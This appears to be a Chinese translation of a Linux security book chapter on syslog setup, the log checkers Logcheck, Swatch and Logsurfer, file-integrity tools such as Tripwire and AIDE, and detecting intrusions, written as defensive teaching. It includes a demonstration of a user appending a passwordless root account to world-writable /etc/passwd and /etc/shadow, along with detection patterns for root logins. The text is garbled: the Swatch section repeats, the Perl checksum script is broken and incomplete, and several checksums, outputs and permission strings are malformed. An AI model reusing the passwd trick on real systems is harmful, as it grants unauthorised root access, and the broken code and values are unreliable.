| news | Usenet 新闻消息 |

# 第 2 章：预防措施与入侵后的恢复

| Syslog 设施 | 描述 |
| --- | --- |
| syslog |  syslog 消息 |
| user | 通用用户级消息 |
| uucp | UUCP 子系统 |
| local0-7 | 本地定义的级别 |

**Syslog 日志级别**：程序每个日志目都有一个日志级别，这样 `syslog` 守护进程就可以根据配置报告或忽略它。可用的日志级别按严重程度排序如下：

| 日志级别 | 描述 |
| --- | --- |
| emerg | 系统不可用 |
| alert | 必须采取行动 |
| crit | 关键情况 |
| err | 错误情况 |
| warning | 警告情况 |
| notice | 正常但重要的情况 |
| info | 信息消息 |
| debug | 调试消息 |

**Syslog.conf**：`/etc/syslog.conf` 文件控制 `syslogd` 记录哪些消息。每行的格式为：

```
facility.loglevel logtarget
```

其中字段之间用制表符分隔。例如，下行代码
`daemon.notice /var/log/daemon.log`

将把所有使用 `daemon` 设施且优先级为 `notice` 或更高的程序日志写入 `/var/log/daemon.log` 文件。你可以使用 `*` 来指定设施或日志级别，以匹配任何设施或日志级别。

消息投送的目标可以是以下任何形式之一：

| 目标 | 描述 |
|---|---|
| /path/to/filename | 消息将追加到给文件中。这是最常见的情况。 |
| @loghost | 消息将发送到机器 "loghost" 上的 syslog 服务器进行处理。 |
| /path/to/named_pipe | 消息将写入指定的命名管道（适用于使用外部程序进行过滤）。 |
| user1,user2 | 如果列出的用户已登录，消息将写入这些用户处。 |
| * | 消息写入所有已登录的用户。 |
| /dev/console | 消息写入指定的 tty。 |

注意：用于记录消息的 `@loghost` 目标是让你的日志传输到多台机器的一种种简单方法。这在机器被攻破时非常有帮助。如果被黑的机器上删除了任何痕迹，这些痕迹可能仍然存在辅助日志机器上。如果可能，你应该配置一台安全的机器来接收 `syslog` 消息。

因此，一个良好的 `syslog.conf` 示例可以是：



## 将所有消息记录到 `/var/log/messages`

### 以便日志检查程序扫描

`*.debug /var/log/messages`

### 在情况非常糟糕时写入终端

`kern,daemon.crit /dev/console`

`kern,daemon.crit root`

`*.emerg`

### 分离其他日志以便于阅读

### 为更重要的设施设置 debug 级别

`kern.debug /var/log/kern.log`

`mail.debug /var/log/mail.log`

`daemon.debug /var/log/daemon.log`

`auth.debug /var/log/auth.log`

`syslog.debug /var/log/syslog.log`

`authpriv.debug /var/log/authpriv.log`

`ftp.debug /var/log/ftp.log`

### 其他的 notice 级别

`user.notice /var/log/user.log`

`lpr.notice /var/log/lpr.log`

`news.notice /var/log/news.log`

`uuucp.notice /var/log/uucp.log`

`cron.notice /var/log/cron.log`

`local0,local1,local2.notice /var/log/local.log`

`local3,local4,local5.notice /var/log/local.log`

`local7 /var/log/local.log`

查看 `syslog.conf` 页面获取更多可用选项，使你的日志记录更具体。

### Syslog 消息格式：Syslogd 对接收到的消息格式化如下：

`Mon Day Time hostname processname[pid]: log_record`

因此，一个示例片段可能所示：

- Feb 05 07:18:12 myhost [1827]: Cleaned cache of 14 RRAsets
- Feb 05 17:18:12 myhost [1827]: Late server on 'example.com'
- Feb 21 08:42:51 myhost sshd[8818]: Connection closed by remote host.
- Feb 21 08:43:15 myhost sshd[8818]: ROOT LOGIN as 'root' from www.example.com
- Feb 25 12:23:46 mailstunnel [716]: Generating 512 bit RSA key...
- Feb 25 22:53:51 myhost stunnel [716]: imapd bound to 0.0.0.993
- Feb 28 18:28:19 myhost sshd[8818]: Generating new 768 bit RSA key.

列出的主机名是 syslog 消息的来源。如果没有人向你的主机发送 syslog 消息，你将在文件中只看到你的主机名。

### 扫描你的日志文件

定期检查日志文件以发现警告活动是非常重要的。这包括黑客尝试（例如，如果你看到某个用户有多次登录失败）或非安全相关问题（例如，交换空间耗尽）。日志的全部目的是帮助管理员——忽略它们是无用的。

每天读取你的日志文件是很枯燥的。会有很多在日常运行中并不重要的信息，你可以忽略它们。因此，人们不会直接查看日志，而是依靠使用软件进行日志分析，以筛选出重要部分。运行日志检查程序有两种主要方法：

- 日志检查 cron：你可以使用 `cron` 运行日志检查程序。这是一种常用方法，因为你可以设置程序按特定间隔运行。
- 日志检查守护进程：你也可以将日志检查程序作为守护进程运行。如果你想实时监控日志，这种方法很有用。

第一种方法 `cron` 对于大多数用户来说通常足够了，因为它的资源消耗较低。第二种方法 `daemon` 更适合那些需要对安全事件获取即时警报的人。

列出的主机名是 syslog 消息的来源。如果没有人向你的主机发送 syslog 消息，你将在文件中只看到你的主机名。

# Linux 攻破解：Linux 安全秘密与解决方案

日志文件权限：确保你的日志不是所有人都能读取的是一个好主意。它们可能包含敏感信息，会帮助黑客提升访问权限。一个常见的例子是输入用户名和密码的粗笨打字员。因此，你应该让日志的所有者为 `root`，并允许 "`log`" 组读取，而对“其他”用户不给权限。比起 `root` 被攻破，一个虚拟账户被攻破要好得多。

# 第 2 章：主动措施与从入侵中恢复

## 日志分析套件

在接下来的章节中，我们将讨论日志检查套件。其中某些套件的功能与其他不同。你应该尝试每一个，找到你觉得最顺手的那个。网上还有其他的日志分析程序。你甚至可能会发现，对你最好的工具是你自己写的。

### Logcheck

`Logcheck`（Psionic Software 开发的 Abacus 套件的一部分，http://www.psionic.com/abus-logcheck/）是一个基于 `cron` 风格的日志检查器。它使用多个包含 `egrep` 正则表达式的文件，并用这些表达式与日志文件中的行进行匹配，以确定是否应该生成报告。报告会发送给 `root` 或你指定的用户。有几个包含 `Logcheck` 使用表达式的主文件：

- `logcheck.hacking`: 明确指示黑客攻击活动的表达式。任何匹配的消息都会随带一个显眼的头部发送邮件，以立即引起注意。
- `logcheck.violations`: 表示不当活动的表达式，但其严重程度没有 `logcheck.hacking` 中的那么高。
- `logcheck.ignore`: 实际上是无害的表达式。如果某一行匹配了 `logcheck.violations` 中的规则，但也匹配了 `logcheck.ignore` 中的规则，则不会进行报告。

例如，此文件允许你捕获包含“refused”的消息（如“TCP connection refused”），而不会报告无辜的消息，例如 sendmail 无法连接到邮件服务器的“stat=refused”。

用于消除误报。
如果到目前为止没有任何匹配项，除非在 `logcheck.ignore` 文件中有匹配项，否则该行将被报告。

```
Logcheck 自带了默认模式，这些模式由 ISS 攻击、FWTK 消息、TCP wrappers 和 Linux 特有的消息构建而成，因此它已经适用于默认的 Linux 安装。

Logcheck 使用 `bourne shell` 和 C 语言编写。它包含一个名为 `logtail` 的工具，该工具通过跟踪已分析的行号，自动处理只读取日志文件的新部分。该系统基于 Marcus Ranum 和 Fred Avlio 为 Gauntlet 防火墙编写的 `frequentcheck.sh` 脚本，尽管它们之间没有共享代码。
```

![](img/33829ffb1435b4baef56fcd2c28ec6cd_72_0.png)

### Swatch

`Swatch`（Simple Watchdog，http://www.stanford.edu/~atkins/swatch/）由 Todd Atkins 编写。它可以通过单次模式读取日志文件，也可以通过 `tail` 跟踪它们以便在行被写入时读取它们，还可以读取任意命令的输出。

`Swatch` 用 Perl 语言编写的。它需要来自 CPAN 存档的某些模块。

安装程序将在这些模块尚可用时帮助自动抓取并安装它们。

`Swatch` 的配置由模式组（pattern）和操作组（action）组成。模式必须是有效的 Perl 正则表达式，它与 (grep) 正则表达式兼容，但更健壮。每当某行匹配模式时，就会执行与其相关的一个或多个操作。各种操作列在这里：

```
echo      将该行打印到标准输出。（你甚至可以指定使用的颜色，这对于突出显示不同重要性级别很有用）。
bell      在运行 Swatch 的终端上响铃。
mail      将匹配的行发送给一个或多个用户。
write     将这些行写入一个或多个用户。
pipe      将匹配的行作为标准输入发送给程序。
th 这种伪操作允许你调整条目必须发生的频率以便显示多次。
```

下面是一个 `Swatch` 配置文件的示例，你可以用它扫描由 `ssh` 生成的日志文件：



## 忽略某些模式

```
ignore = /Log: Server listening on port \d+$/
ignore = /Log: Connection from .* port \d+$/
ignore = /Log: Generating new \d+ bit RSA key./
ignore = /Log: RSA key generation complete./
ignore = /Log: .* authentication for .* accepted./
ignore = /Log: Closing connection to/
ignore = /fatal: Read error from remote host/
ignore = /fatal: Connection connected by remote/
ignore = /Log: Wrong response to RSA authentication challenge/
ignore = /fatal: Read from socket failed: Connection timed out./
n
```

### 高亮显示我们预期的 root 登录

```
watchfor = /Log: ROOT LOGIN as 'root' from trusted.example.com/
echo magenta
```

### 对我们未预料的 root 登录发出严重警告

```
watchfor = /log: ROOT LOGIN/
echo echo magenta_h
bell 2
mail root@localhost:reegen@localhost,subject=ROOT LOGIN ALERT
write root:reegen
exec /opt/bin/page_admins $0
```

### Forward/反向映射错误

```
watchfor = /POSSIBLE BREAKIN ATTEMPT!/
echo red
```

```
watchfor = /fatal:/
echo blue
```

### 确保任何我们没有显式忽略的项都记录在不显眼的绿色中。当我们发现新的重要内容时我们将为它们制定更多规则。

```
watchfor = /.*/
echo green
```

> 在上述代码的末尾，我们指定了一个匹配任何日志行的模式 `"/.*"`。这确保了我们将输出任何未被显式忽略但未匹配我们任何特定 `watchfor` 条目的日志行。确保你不会因为不知道它们而意外漏掉日志条目是非常重要的

![](img/33829ffb1435b4baef56fcd2c28ec6cd_75_0.png)

## Hacking Exposed: Linux Security

图 2-2 显示了 Swatch 的输出。

## 使用 Swatch 扫描日志

使用 Swatch 扫描日志 注意：上面的 Swatch 配置是

Swatch 配置由模式组和操作组组成。模式必须是有效的 Perl 正则表达式，它与 `grep` 正则表达式兼容，但更健壮。每当某行匹配模式时，就会执行与其相关的一个或多个操作。各种操作列在这里：

```
echo      将该行打印到标准输出。（你甚至可以指定使用的颜色，这对于突出显示不同重要性级别很有用）。
bell      在运行 Swatch 的终端上响铃。
mail      将匹配的行发送给一个或多个用户。
write     将这些行写入一个或多个用户。
pipe      将匹配的行作为标准输入发送给程序。
th 这种伪操作允许你调整条目必须发生的频率以便显示多次。
```

下面是一个 Swatch 配置文件的示例，你可以用它扫描由 `ssh` 生成的日志文件：

```
## 忽略某些模式
ignore = /Log: Server listening on port \d+$/
ignore = /Log: Connection from .* port \d+$/
ignore = /Log: Generating new \d+ bit RSA key./
ignore = /Log: RSA key generation complete./
ignore = /Log: .* authentication for .* accepted./
ignore = /Log: Closing connection to/
ignore = /fatal: Read error from remote host/
ignore = /fatal: Connection connected by remote/
ignore = /Log: Wrong response to RSA authentication challenge/
ignore = /fatal: Read from socket failed: Connection timed out./
n

### 高亮显示我们预期的 root 登录
watchfor = /Log: ROOT LOGIN as 'root' from trusted.example.com/
echo magenta
```

```
### 对我们未预料的 root 登录发出严重警告
watchfor = /log: ROOT LOGIN/
echo echo magenta_h
bell 2
mail root@localhost:reegen@localhost,subject=ROOT LOGIN ALERT
write root:reegen
exec /opt/bin/page_admins $0
```

```
### Forward/反向映射错误
watchfor = /POSSIBLE BREAKIN ATTEMPT!/
echo red
```

```
watchfor = /fatal:/
echo blue
```

### 确保任何我们没有显式忽略的项都记录在不显眼的绿色中。当我们发现新的重要内容时我们将为它们制定更多规则。

```
watchfor = /.*/
echo green
```

> 在上述代码的末尾，我们指定了一个匹配任何日志行的模式 `"/.*"`。这确保了我们将输出任何未被显式忽略但未匹配我们任何特定 `watchfor` 条目的日志行。确保你不会因为不知道它们而意外漏掉日志条目是非常重要的

![](img/33829ffb1435b4baef56fcd2c28ec6cd_75_0.png)

## Logsurfer

由德国 DFN-CERT 的 Wolfgang Ley 和 Uwe Ellermann 编写，Logsurfer（http://www.cert.de/logsurfer/）比那两个软件包更进了一步。第一个新增功能是创建动态规则。第二个新增功能是将行分组。

例如，如果你看到有人成功向本应该是只写目录的 FTP 服务器写入文件，你可能希望

Logsurfer 对精确记录的内容有很好的控制，但它的配置非常棘手，并且消耗大量的系统内存和 CPU。例如，大多数日志检查器的默认操作是输出，而你必须显式调用 `/bin/echo` 配合 `pipe` 操作来执行任何输出。Logsurfer 可能

### Logsurfer 配置

Logsurfer 的配置比之前的要复杂。和 Switch 一样，它使用正则表达式（标准正则，不是 Perl 扩展）来判断匹配。配置行的格式为

`match-exp not-match-exp stop-exp not-stop-exp timeout action`

字段解释如下：

| match-exp | 表示匹配且应处理该行的正则表达式。 |
| not-match-exp | 如果 `match-exp` 匹配，但 `not-match-exp` 也匹配，则视为不匹配。（允许“如果/但非” 逻辑）。 |
| stop-exp | 如果行匹配 `stop-exp`，则删除它。 |
| not-stop-exp | 与 `not-match-exp` 类似，这意味着“如果 `stop-exp` 匹配，除非 `not-stop-exp` 也匹配，否则删除该规则”。 |
| timeout | 此规则生效的秒数（0 表示无超时）。 |
| action | 列表中的操作之一。操作可以带有可选参数。 |

以下是该字段允许的操作：

| ignore | 忽略此规则。 |
| exec | 运行指定的程序。 |
| pipe | 运行指定的程序并将日志行作为标准输出发送给它。 |
| open | 开启一个新的上下文。 |
| delete | 删除一个上下文。 |
| report | 打开程序并向其发送所有指定的上下文定义。 |
| rule | 创建动态规则。 |

## 揭秘 Linux 攻击：Linux 安全秘密与解决方案

对于非常特定的日志分析，可以结合 Logcheck 或 Swatch 使用；而对于大部分日志检查工作。

## 文件系统完整性检查

黑客在入侵你的机器后可能会做的事情就是修改你系统上的文件。下表列出了经常被更改的文件：

| 类型 | 示例 |
|---|---|



| 服务器配置文件 | `/etc/inetd.conf` `/etc/ftpaccess` |

| 网络配置文件 | `/etc/host.conf` `/etc/sysconfig/network` |

| 系统配置文件 | `/etc/ld.so.conf` `/etc/nsswitch.conf` |

| 定时任务表 (Crontabs) | `/etc/cron.daily/*` `/var/spool/root` |

| 设置用户 ID 的程序 | `/bin/su`, `/bin/ping` `/usr/bin/chfn`, `/sbin/dump` |

| 设置组 ID 的程序 | `/sbin/netreport`, `/usr/bin/bin/lpr` `/usr/bin/write`, `/usr/bin/man` |

如果你知道机器何时被入侵，可以查看修改时间并检查是否有任何变化。如果你想查看自 9 月 17 日入侵以来所有更改的文件，可以运行以下命令：

```
### touch 09170000 /tmp/comparison
### find / -newer /tmp/comparison -o -cnewer /tmp/comparison -ls
-rws-xr-X 1 root root 17968 Sep 17 02:57 /bin/ping*
-rws-xr-X 1 root root 14188 Sep 17 02:28 /bin/su*
-rw-r--r-- 1 root root 111 Sep 18 19:39 /etc/ld.so.conf
```

请记住，检查文件时间统计信息是不可靠的。`touch` 命令可以更改任何文件的修改时间 (`mtime`) 或访问时间 (`atime`)；事实上，这正是我们创建 `/tmp/comparison` 文件的方法。因此，黑客可以轻松地重置他修改过的任何文件的日期。

> 使用 `touch` 总是会更新更改时间 (`ctime`)；然而，黑客在破解 root 账户后，没有理由不能简单地使用 `touch` 更改系统时，使得 `ctime` 也成为一个不可靠的来源。

## 第二章：主动措施与从入侵中恢复

### 校验和

由于比较文件时间戳没有用，我们需要更好的方法来判断文件是否被更改过。这就是校验和（Checksums）。

校验和是由数学算法生成的字符串，允许你判断两个文件是否相同。文件中即使只改变一个位（`bit`），会导致校验和不同。通过将你下载的文件校验和与发行网站上列出的校验和进行对比，你可以确信它们是相同的。

尽管有多种类型的校验和（其中某些在第 4 章中描述），但我们在这里将讨论限制在 MD5 校验和。它是目前可用的最强且最常用的校验和。

使用命令行 `md5` 程序的快速示例可以让你看到这些校验和的样子：

```
machine# md5sum /bin/ping /bin/su /etc/ld.so.conf
ec2182ff077c2962d757a36fee0d66 /bin/ping
ffe87dedddf2232130a3fcd9998543 /bin/su
29438cc92fe276e29167ffd4f36b0a /usr/bin/passwd
```

长字符串就是 MD5 校验和。查看 `/etc/ld.so.conf` 文件：

```
machine# cat /etc/ld.so.conf; echo; md5sum /etc/ld.so.conf
/usr/X11/lib
/usr/lib
/usr/kerberos/lib
/usr/i486-linux-libc5/lib
```

```
e457ee5208d4f028e2d5c7aad415d /tmp/ld.so.conf
```

让我们通过将 `ld.so.conf` 修改为以下内容来看查看：

```
machine# cat /etc/ld.so.conf; echo; md5sum /etc/ld.so.conf
/../lib
/usr/X11/lib
/usr/lib
/usr/kerberos/lib
/usr/i486-linux-libc5/lib
```

```
682f68b5e144a26fea674f0d3483cdf7b /tmp/ld.so.conf
```

注意，校验和完全不同。事实上，即使只是简单的增加或更改一个字符，它看起来也会完全不同。所以，如你所看到的，通过检查文件内容来确定哪些文件被更改过，这比检查文件的修改时间要好得多。

### 文件权限

确定文件完整性的另一个主要要要素是文件权限。考虑以下场景：

```
nonroot$ ls -la /etc/shadow /etc/passwd
-rw-rw-rw- 1 root root 679 Sep 17 12:15 /etc/passwd
-rw-rw-rw- 1 root root 595 Sep 17 12:15 /etc/shadow
nonroot$ echo 'root:x:0::' >> /etc/passwd
nonroot$ echo 'root:x:0::' >> /etc/shadow
root# ls -la /etc/shadow /etc/passwd
-rw-r--r-- 1 root root 679 Feb 25 15:08 /etc/passwd
-rw-r--r-- 1 root root 595 Feb 25 15:08 /etc/shadow
```

这里的用户只是向 password 和 shadow 文件添加了一个具有已知密码的 root 等级账户（命名为 root），因为这些文件是完全可写的。然而，在用 `vi` 等编辑器删除 "root" 条目后，文件恢复到了之前的内容，尽管时间戳受到了影响，但我们已经证明时间戳是可以伪造的。通过检查权限，你可以知道何时发生了更改，然后判断它们是合法的、意外的还是恶意的，并确定影响。

权限滥用包括：

- 可读配置/日志文件：配置和日志文件包含敏感信息，不应被普通用户读取。黑客可能会读取这些文件以便访问。可写程序：如果任何系统程序（例如 `ls` 或 `cp`）允许非 root 用户修改，黑客就能将其替换为木马版本。可写脚本：修改 `/etc/rc.d` 目录下的文件允许黑客在启动时运行任何命令。

错误的假设

许多目录具有“粘性位”（sticky bit），这意味着用户只能删除自己的文件。这是 `/tmp` 和 `/var/tmp` 的默认设置，许多脚本使用它们。移除粘性位会使这些程序受到链接攻击。

可写的 setid 程序

黑客可以修改 setid 程序以目标用户的身份运行。许多内核已经保护了 setid 程序。如果 setid 程序被修改，setid 位会被自动移除。检查权限出于几个原因：

- 知道权限何时被管理员故意或黑客更改。
- 查看何时安装了额外的文件和程序。
- 知道何时删除了系统文件，例如 `/etc/hosts`。

### 生成校验和数据库

为了使校验和有用，你必须在黑客入侵你的机器之前拥有文件的校验和。因此，在你被入侵后必须主动准备这个数据库。让我们来看一个快速脚本，它可以允许你生成自己的“数据库”（这里是纯文本文件的权限和校验和）：

```perl
#!/usr/bin/perl

use MD5;
require 'find.pl';

$md5 = new MD5;
@dirs = @ARGV;
```

```perl
for $dir ( $dirs ) { find($dir); };
```

```perl
sub wanted { push @files, $name; } # 此子程序为每个找到的文件被调用
```

```perl
for $name { sort @files ) (
  ($uid, $gid) = (stat $name) [4,5];
  $stat = sprintf "%0o", ($stat ) [2];
  unless ( -f $name ) {
    printf "%s\t$uid\t$gid\t\t$name\n";
    next;
  } # 如果不是普通文件则中止
```

```perl
### 执行校验和
md5->reset();
open FILE, $name or print (STDERR "Can't open file $name\n"), next;
$md5->addfile(FILE);
close FILE;
```

在我的机器上作为 `~check` 运行时，结果如下：

| 权限 | UID | GID | 校验和 | 路径 |

|---|---|---|---|---|

| 41777 | 0 | 0 | | `/tmp` |

| 41500 | 101 | 99 | | `/tmp/.dot` |

| 100700 | 101 | 99 | 80f1126b94034fb8c9d695874e43aa0d | `/tmp/.dot/file1` |

| 100660 | 200 | 100 | 99ae91e4e908be2da6e1ecf4e8b7e4d2 | `/tmp/bri` |

| 100660 | 201 | 100 | f68ccb529675bade1fdf40cecb035be6 | `/tmp/bree` |



| 40775 | 200 | 100 | | `/tmp/kid` |

| 100624 | 202 | 109 | 789d371690ac24d308126dc4c937f2 | `/tmp/kid/reigen` |

| 100444 | 847 | 200 | 4b6b4e6588e5e3aa9999dee8d6a814 | `/tmp/james` |

| 100555 | 710 | 250 | 52c104ac7c2b3162eb2f67227cetedd0 | `/tmp/taxee` |

# 第2章：预防性措施与从入侵中恢复

## 文件完整性工具的陷阱

将文件完整性工具生成的数据库存放在最方便的地方是本地机器上，这样你可以轻松地将其与上一次运行的结果进行比较，并让工具通过 `cron` 自动运行。虽然这样做很方便，但会留下一个简单的安全问题。

假设黑客已经破解了你机器的 `root` 权限。如果她花时间扫描机器，她很可能会发现你存储所监控目录校验和校验和的文件。如果她需要对文件系统进行任何更改（例如，将一个库替换为带有木马的库），她只需要修改其所修改的文件对应的数据库中的正确行即可。任何将当前值与旧值（被入侵者篡改的值）进行比较的检查现在都将显示没有差异。

因此，将这些数据库保存在不同的机器上更好。有些地方会将它们存储在 `WORM`（只写多次读）设备上，那里文件没有被篡改的机会。

为了给你的数据库增加一层安全性，你可以使用 `chatter +i database` 来使你的数据库变为不可变（意味着它不能被修改、删除、重命名或链接）。在进行任何更改之前，记得执行 `chatter -i database`。但不要忘记，拥有 `root` 权限的黑客可以轻易关闭它。这并不是坚固的安全；它只是黑客在破坏你的数据库时必须攻克的 `Tripwire` 的又一个步骤。

然而，一个陷阱是工具本身。黑客可以将完整性程序本身替换为另一个版本，该版本始终对受损的文件报告未经修改的信息。因此，即使数据存储在某个无法触及的地方，每次完整性扫描的结果也将与之前的结果匹配。

避免这些问题的最佳方法是什么？大多数解决方案都将程序和数据库保持在不同的机器上，并且在需要时以尽可能安全的方式加载它们。例如，你可以从 `CD-ROM` 运行程序，并仅在测试期间将数据库放在软磁盘上；或者你可以每次通过 `Ssh` 从可信源复制文件并运行该版本，然后将结果输出回可信机器进行分析。

### 现有的文件完整性工具

在描述完理论后，我们将介绍目前提供的各种解决方案。

`Tripwire` 是第一个广泛使用的文件完整性工具。它由 Eugene Kim 和 Gene Spaffer 为普渡渡大学的 `COAST` 项目开发，并于 1992 年发布，它在一夜之间变成了事实上的文件完整性工具。

1998 年，`COAST` 将该机器和产品授权给了 `Tripwire, Inc.`，该公司部分由创建者 Gene Kim 组成。`Tripwire, Inc.` 现在负责 `Tripwire` 的开发。

## Linux 内部黑客攻击揭秘：Linux 安全秘密与解决方案

由于交接，现在有多个版本的 `Tripwire` 可用：

| 版本 | 描述 |
| :--- | :--- |
| 1.2.x | `COAST` 的原始版本。可用地址：http://coast.cs.purdue.edu/pub/tools/unix/ids/tripwire。 |
| 1.3.x | `Tripwire, Inc.` 提供的学术源码发布版本 (`ASR`)。本质上是 1.2.x 版本，包含一些修复和关于交接的说明。可用地址：http://tripwire.com。 |
| 2.2.x commercial | `Tripwire` 的商业版本，运行在多个 `UNIX` 平台和 `Windows NT` 上。新功能包括一个通信管理器，允许远程管理多台机器。可用地址：http://tripwire.com。 |
| 2.2.x for Linux | `Tripwire` 提供的精简版仅限 `Linux` 版本，具有略微限制的许可协议，允许用户仅以特定方式运行一个 `Tripwire` 副本。它不包含完整商业版的某些功能，包括通信代理。可用地址：http://tripwire.com。 |
| 2.3.x | 在 `GPL` 协议下发布的 `Tripwire` 开源 `Linux` 版本，可用地址：http://sourceforge.net/projects/tripwire 和 http://tripwire.org。 |

如果你想使用 `Tripwire` 但不希望购买商业产品，你应该建议使用 `ASR` 版本或 2.3.x 开源版本。两者都带有完整的源代码并具有相同的功能。如果你管理的不是 `Linux` 机器（`*BSD`, `Solaris`, 等），你可能更倾向于使用 `ASR` 版本，并在跨平台上使用单一版本。如果你只管理 `Linux`，2.3.x 分支可能是最好的。

`Tripwire` 支持许多校验和算法，包括 `MD5`, `Sferru`, `CRC-32`, `CRC-16`, `MD4`, `MD2`, `SHA/SHA` 和 `HAVAL`，尽管并非所有算法在所有版本都可用。

不同版本之间的配置语法基本相同，因此可以在多个机器和版本中使用相同的文件。然而，数据库格式自早期以来已经发生了变化，可能无法在系统之间通用。

### AIDE

高级入侵检测环境 (`http://www.cs.tut.fi/~rammer/aide.html`)。最初似乎 `Tripwire` 正在变成一个纯闭源产品。)它实现了 `Tripwire` 的所有功能（尽管不是所有的校验和算法），并扩展了功能和配置语法。

配置文件与 `Tripwire` 使用的类似，因此在两者之间转换相当容易。该语言允许简单的 `if/elseif` 语句、变量定义和重用以及配置标志设置。`AIDE` 比 `Tripwire` 有更好的方法来指定所需的权限/校验和。运行 `AIDE` 需要的所有信息都设置在

# 第2章：主动措施与从入侵中恢复

| 属性 | 描述 | 安全影响 |
| :--- | :--- | :--- |
| `p` | 文件权限 | 更改文件权限通常用于向应受保护的文件授予读取/写入或设置 `userid` 的访问。 |
| `i` | `Inode` 编号 | 如果 `inode` 编号发生变化，说明文件本身在某个时刻被动过过（删除或重命名）。 |
| `n` | 链接数 | 如果一个文件的硬链接比之前多，则现在该程序关联了一个额外的路径名。例如，如果这是一个有漏洞的 `setuserid` 程序，删除原始文件不会删除新链接，问题文件仍然存在。如果文件的硬链接较少，则说明该程序的一个另一个命名的副本已被删除。在某些系统中，`cp`、`mv` 和 `ln` 实际上是同一个程序。如果其中一个突然被解除链接，可能意味着其中一个被另一个版本替换了。 |
| `u` | 用户所有权 | 可以像文件权限一样，通过将所有权转移给他人来授予不恰当的文件访问权限。 |
| `g` | 组所有权 | 与用户所有权相同。 |
| `s` | 文件大小 | 文件大小的变化始终表明其内容发生了变化。 |
| `m` | `Mtime` | 文件的最后修改时间。这是文件在某个（或多个）时刻被修改过的明确指示。容易被黑客伪造。 |

**表 2-1.** 状态检查定义

# 揭秘 Linux Hacker：Linux 安全秘密与解决方案

| 属性 | 描述 | 安全影响 |
| :--- | :--- | :--- |
| `a` | `Atime` | 最后访问时间。这通常没有太大帮助。例如，每当用户列出目录时，`ls` 二进制文件都会变化。这种测量变化并不说明什么，除非你知道某个文件不应该被访问（如果是这样，它为什么会在你的系统上呢？同样可以被黑客伪造。 |
| `c` | `Ctime` | `Inode` 最后更改时间。这些变化表明文件内容或名称已通过修改。同样，容易被黑客伪造。 |
| `s` | 大小增长 | 文件可能会增大或保持大小不变，但不会缩小。适用于日志文件。注意此标志是大写字母 "`S`"。 |

表 2-1. 状态检查定义（续）

| 算法 | 描述 |
| :--- | :--- |
| `md5` | 由 `RSA Data Security, Inc.` 开发的 `MD5` 校验和。一种广泛使用且信任的消息摘要算法。 |
| `sha1` | 安全哈希算法，基于 `NIST` 数字签名标准 (`SHS`)。比 `MD5` 慢，信任度也不及高。 |
| `rmd160` | `RIPEMD-160`，一种迭代哈希函数。 |
| `tiger` | 快速哈希函数。 |
| `crc32` | `CRC32` 校验和，循环冗余校验。非常快，但没有 `MD5` 这样的消息摘要算法健壮。仅在编译时启用了 `mhash` 支持时才可用。 |
| `haval` | `Havel` 校验和，仅在编译时启用了 `mhash` 支持时可用。 |
| `gost` | `Gost` 校验和，仅在编译时启用了 `mhash` 支持时可用。 |

表 2-2. 可用的校验和算法

| 组名 | 等效于 | 描述 |
| :--- | :--- | :--- |
| `E` | | 空组（忽略 `[E]`所有内容）。 |
| `L` | `p+i+n+u+g` | 仅文件权限和所有权检查（`[L]`日志文件）。 |



| R | p+i+n+u+g+s+m+c+md5 | 与 L 相同，加上文件大小和时间检查以及 MD5 校验和（[R]只读）。 |

| > | p+i+n+u+g+5 | 有助于指示增长的日志文件。它预计会随时间增长，但权限不应改变。如果日志文件自动轮转，可能会导致误报。 |

表 2-3. 分组

通常情况下，无论你选择何种软件，使用多个校验和算法都是一个好主意。在数学上，是有可能（尽管概率极低）修改一个文件并使其对于给定算法保留相同的校验和。然而，创建一个让两个独立算法都产生相同校验和文件的概率要指数级地增加。要找到一个既匹配两个校验和又有用的文件，简直是不可能的。（不要忘记，如果尝试对 `/etc/inetd.conf` 文件植木马，它不仅必须匹配正确的校验和以避免 IDS 警告，还必须符合有效的 inetd.conf 格式）

在经常使用 AIDE 之前，我们必须先创建初始数据库：

```
machine# aide -i -c /aide.conf
```

这将创建你文件系统的第一个快照。你应该在安装好机器后尽快执行此操作，务必在连接网络并让自己暴露在潜在黑客面前之前。之后，你可以随时运行不带 `"-i"` 选项的 AIDE 来查看发生了哪些更改。如果你考虑了所有更改并确定它们是无害的，可以使用 `-u` 选项更新数据库。

> 注意，“u” 选项不会覆盖数据库；它要求数据库是一个单独的文件。你应该备份原始数据库，将新数据库复制到旧位置，并在切换过程中没有遗漏任何。

这是一个示例报告：

```
AIDE 发现数据库与文件系统存在差异！！
开始时间: 2000-10-13 15:19:41
摘要:
总文件数=9566,新增文件=0,删除文件=0,更改文件=8

更改的文件：
changed:/sbin/ifup
changed:/sbin/uugetty
changed:/sbin/ypbind
changed:/sbin/iwconfig
changed:/root
changed:/root/.ssh
changed:/root/.ssh/known_hosts
changed:/root/.ssh/authorized_keys

更改的详细信息：

File: /sbin/ifup
Uid: old = 8 , new = 116

File: /sbin/uugetty
Permissions: old = -rwxr-xr-x , new = -rswxr-xrwx

File: /sbin/ypbind
Permissions: old = -xr-xr-x , new = -rwxxrxrwx
Ctime: old = 2000-04-19 04:43:03, new = 2000-09-17 15:19:36

File: /sbin/iwconfig
Uid: old = 8 , new = 116

File: /root
Uid: old = 0 , new = 0

File: /root/.ssh
Permissions: old = -rwxr-xr-x , new = -rswxr-xrwx

File: /root/.ssh/known_hosts
Permissions: old = -rw-r--r-- , new = -rw-r--r--
Ctime: old = 2000-04-19 04:43:03, new = 2000-09-17 15:19:36

File: /root/.ssh/authorized_keys
Permissions: old = -rw-r------- , new = -rwr-------
```

# 揭秘 Linux 破解：Linux 安全秘密与解决方案

现在是时候面对现实了：总有一天，你会被遭遇黑客攻击，在本节中，我们将教你如何处理这种情况。虽然我们希望你不需要经常这样做，但你仍应该仔细阅读这一节。祝你好运！

## 如何判断你是否被黑客入侵

保持机器安全的最方法之一就是知道它何时被入侵了。黑客在你的系统中停留的时间越短，他们能做的破坏就越少，你将他们踢出去并修复损坏的机会就越大。

黑客越老练，你发现机器被攻破的可能性就越低。高明的黑客会掩盖自己的足迹，让你难以察觉到他们做过任何更改，并且即使在你盯着屏幕看时，也能隐藏自己正处于你机器上的事实。通过隐藏进程、打开连接、文件访问和系统资源使用，黑客可以他们的行为变得几乎完全不可见。如果他们拥有 root 账户，他们可以在内核层执行任何想做的事情来隐藏自己的行踪。我们在文中涵盖了许多示例。

有多种方法可以检测你是否被黑客入侵：

- **网页损坏**：新手黑客（或有实际信息的人）一种常见的浪费时间的方法是替换你网站的内容来宣布他们成功破解了。这通常发生在首页，因为那里最引人注目。如果黑客想要保持访问权限，他们很少通过这种方式或其他方式宣布自己的存在。
